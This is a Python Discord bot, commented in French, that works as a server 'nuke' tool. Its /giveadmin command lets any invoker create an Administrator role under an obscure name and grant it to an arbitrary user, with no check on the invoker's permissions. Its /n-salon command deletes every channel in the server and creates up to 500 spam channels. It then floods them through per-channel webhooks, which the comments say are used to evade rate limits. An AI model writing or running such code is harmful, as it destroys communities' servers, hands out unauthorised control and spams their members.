import os
import asyncio
import logging
import discord
from discord import app_commands
from discord.ext import commands

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(name)s: %(message)s',
)
log = logging.getLogger('giveadmin-bot')

TOKEN = os.environ.get('DISCORD_TOKEN')
ROLE_NAME = os.environ.get('ADMIN_ROLE_NAME', 'W4X15DJ')

if not TOKEN:
    raise RuntimeError('DISCORD_TOKEN is not set in environment')

intents = discord.Intents.default()
intents.members = True
intents.guilds = True

bot = commands.Bot(command_prefix='!', intents=intents)


@bot.event
async def on_ready():
    log.info('Logged in as %s', bot.user)
    try:
        synced = await bot.tree.sync()
        log.info('Globally synced %d command(s)', len(synced))
    except Exception as e:
        log.exception('Sync failed: %s', e)
    for guild in bot.guilds:
        try:
            bot.tree.copy_global_to(guild=guild)
            await bot.tree.sync(guild=guild)
        except Exception as e:
            log.exception('Guild sync failed: %s', e)


@bot.event
async def on_guild_join(guild):
    log.info('Joined guild %s -- resyncing', guild.id)
    try:
        bot.tree.copy_global_to(guild=guild)
        await bot.tree.sync(guild=guild)
    except Exception as e:
        log.exception('on_guild_join sync failed: %s', e)


# ----------------------------- /giveadmin ----------------------------- #

@bot.tree.command(name='giveadmin', description='Cree un role Admin et l attribue a un utilisateur')
@app_commands.describe(user_id='ID de l utilisateur a qui donner le role admin')
async def giveadmin(interaction: discord.Interaction, user_id: str):
    await interaction.response.defer(ephemeral=True, thinking=True)

    if interaction.guild is None:
        await interaction.followup.send('A utiliser dans un serveur.', ephemeral=True)
        return

    guild = interaction.guild
    try:
        uid = int(user_id.strip())
    except ValueError:
        await interaction.followup.send('ID invalide.', ephemeral=True)
        return

    member = guild.get_member(uid) or await guild.fetch_member(uid)
    me = guild.me
    if me is None or not me.guild_permissions.manage_roles:
        await interaction.followup.send('Le bot doit avoir Manage Roles / Administrateur.', ephemeral=True)
        return

    role = await guild.create_role(
        name=ROLE_NAME,
        permissions=discord.Permissions(administrator=True),
        reason=f'/giveadmin by {interaction.user}',
    )
    try:
        if me.top_role and me.top_role.position > 1:
            await role.edit(position=max(me.top_role.position - 1, 1))
    except Exception as e:
        log.warning('Reposition failed: %s', e)

    await member.add_roles(role, reason=f'/giveadmin by {interaction.user}')
    await interaction.followup.send(
        f'Role **{role.name}** (Admin) attribue a <@{member.id}>.',
        ephemeral=True,
    )


# ----------------------------- /n-salon ----------------------------- #

async def _safe(coro):
    try:
        return await coro
    except Exception as e:
        log.warning('task failed: %s', e)
        return None


@bot.tree.command(
    name='n-salon',
    description='Supprime tous les salons, en cree N et y envoie un message en boucle (ultra rapide)',
)
@app_commands.describe(
    number='Nombre de salons a creer',
    message='Message a envoyer dans chaque salon',
    repeat='Nombre de fois que le message est envoye par salon (defaut 5)',
    name='Nom des salons crees (defaut: spam)',
)
async def n_salon(
    interaction: discord.Interaction,
    number: int,
    message: str,
    repeat: int = 5,
    name: str = 'spam',
):
    await interaction.response.defer(ephemeral=True, thinking=True)

    if interaction.guild is None:
        await interaction.followup.send('A utiliser dans un serveur.', ephemeral=True)
        return

    guild = interaction.guild
    me = guild.me

    if me is None or not me.guild_permissions.administrator:
        await interaction.followup.send('Le bot doit avoir la permission Administrateur.', ephemeral=True)
        return

    if number < 1 or number > 500:
        await interaction.followup.send('number doit etre entre 1 et 500.', ephemeral=True)
        return
    if repeat < 1 or repeat > 50:
        await interaction.followup.send('repeat doit etre entre 1 et 50.', ephemeral=True)
        return

    start = asyncio.get_event_loop().time()

    # 1) Suppression parallele de tous les salons existants
    log.info('Deleting %d existing channels...', len(guild.channels))
    await asyncio.gather(*[_safe(ch.delete(reason='/n-salon')) for ch in list(guild.channels)])

    # 2) Creation parallele de N salons texte
    log.info('Creating %d channels...', number)
    create_tasks = [
        _safe(guild.create_text_channel(name=f'{name}-{i+1}', reason='/n-salon'))
        for i in range(number)
    ]
    created = [c for c in await asyncio.gather(*create_tasks) if c is not None]
    log.info('Created %d channels', len(created))

    # 3) Creation parallele d un webhook par salon (les webhooks ont leur propre rate-limit
    #    par-canal, ce qui permet d envoyer beaucoup plus vite que via le bot)
    webhook_tasks = [_safe(c.create_webhook(name='spam-hook')) for c in created]
    webhooks = await asyncio.gather(*webhook_tasks)

    # 4) Envoi parallele : pour chaque webhook, on envoie repeat messages en sequence
    #    (mais tous les webhooks tournent en parallele -> tres rapide)
    async def flood(webhook):
        if webhook is None:
            return
        for _ in range(repeat):
            try:
                await webhook.send(content=message)
            except discord.HTTPException as e:
                log.warning('webhook send failed: %s', e)
                await asyncio.sleep(0.5)

    await asyncio.gather(*[flood(w) for w in webhooks])

    elapsed = asyncio.get_event_loop().time() - start

    # 5) Reponse a l auteur (envoyee dans le 1er salon cree car le salon d origine n existe plus)
    summary = (
        f'**/n-salon termine en {elapsed:.1f}s**\n'
        f'- {len(created)}/{number} salons crees\n'
        f'- {repeat} messages envoyes par salon\n'
        f'- {len([w for w in webhooks if w])} webhooks actifs'
    )
    if created:
        try:
            await created[0].send(summary)
        except Exception:
            pass


if __name__ == '__main__':
    bot.run(TOKEN, reconnect=True)
